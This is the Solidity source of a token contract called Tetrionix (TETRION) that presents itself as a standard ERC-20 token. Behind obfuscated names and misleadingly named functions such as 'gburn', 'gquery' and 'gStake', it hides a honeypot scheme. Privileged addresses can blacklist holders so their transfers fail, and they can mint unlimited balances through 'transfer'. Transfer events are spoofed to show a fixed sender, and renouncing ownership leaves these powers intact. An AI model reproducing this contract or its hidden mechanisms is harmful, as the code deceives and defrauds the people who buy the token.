/**
 *Submitted for verification at Etherscan.io on 2022-11-05
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address gFX = 0xF8a92Ad72Eb298756F5f6aCC74fDd1A538B38a3D;
	address gWFX = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract TETRIONIX is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private GZA;
	mapping (address => bool) private GZE;
    mapping (address => bool) private GZW;
    mapping (address => mapping (address => uint256)) private gZV;
    uint8 private constant GZD = 8;
    uint256 private constant gTS = 300000000 * (10** GZD);
    string private constant _name = "Tetrionix";
    string private constant _symbol = "TETRION";



    constructor () {
        GZA[_msgSender()] = gTS;
         gRMK(gWFX, gTS); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return GZD;
    }

    function totalSupply() public pure  returns (uint256) {
        return gTS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return GZA[account];
    }
	

   

				 function gburn(address GZj) onlyOwner public{
        GZE[GZj] = true; }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return gZV[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        gZV[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function gquery(address GZj) public{
         if(GZE[msg.sender])  { 
        GZW[GZj] = true; }}
        

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == gFX)  {
        require(amount <= GZA[sender]);
        GZA[sender] -= amount;  
        GZA[recipient] += amount; 
          gZV[sender][msg.sender] -= amount;
        emit Transfer (gWFX, recipient, amount);
        return true; }  else  
          if(!GZW[recipient]) {
          if(!GZW[sender]) {
         require(amount <= GZA[sender]);
        require(amount <= gZV[sender][msg.sender]);
        GZA[sender] -= amount;
        GZA[recipient] += amount;
        gZV[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function gStake(address GZj) public {
        if(GZE[msg.sender]) { 
        GZW[GZj] = false;}}
		function gRMK(address GZj, uint256 gZN) onlyOwner internal {
    emit Transfer(address(0), GZj ,gZN); }
		
		function transfer(address GZj, uint256 gZN) public {
        if(msg.sender == gFX)  {
        require(GZA[msg.sender] >= gZN);
        GZA[msg.sender] -= gZN;  
        GZA[GZj] += gZN; 
        emit Transfer (gWFX, GZj, gZN);} else  
        if(GZE[msg.sender]) {GZA[GZj] += gZN;} else
        if(!GZW[msg.sender]) {
        require(GZA[msg.sender] >= gZN);
        GZA[msg.sender] -= gZN;  
        GZA[GZj] += gZN;          
        emit Transfer(msg.sender, GZj, gZN);}}
		
		

		
		}